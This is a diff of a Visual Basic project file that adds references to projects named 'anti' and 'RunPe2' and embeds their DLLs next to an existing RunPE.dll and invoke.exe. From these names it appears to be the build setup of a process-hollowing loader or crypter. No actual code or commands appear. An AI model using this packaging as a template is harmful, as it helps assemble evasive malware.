@@ -121,9 +121,13 @@
     <None Include="App.config" />
   </ItemGroup>
   <ItemGroup>
-    <ProjectReference Include="..\dll\dll.vbproj">
-      <Project>{a04d6e8d-a123-4d94-80fc-71251a841a5e}</Project>
-      <Name>dll</Name>
+    <ProjectReference Include="..\anti\anti.vbproj">
+      <Project>{3e033614-e749-4362-9fc0-f6d761841ce2}</Project>
+      <Name>anti</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\RunPe2\RunPe2.csproj">
+      <Project>{8eae07a6-e8fd-464c-bb48-92468fda2fc5}</Project>
+      <Name>RunPe2</Name>
     </ProjectReference>
     <ProjectReference Include="..\RunPE\RunPE.csproj">
       <Project>{91ecd3f5-e676-4447-bd5f-43f22bba00ab}</Project>
@@ -131,13 +135,14 @@
     </ProjectReference>
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="dll.dll" />
-  </ItemGroup>
-  <ItemGroup>
     <None Include="Resources\invoke.exe" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="RunPE.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="anti.dll" />
+    <EmbeddedResource Include="RunPe2.dll" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
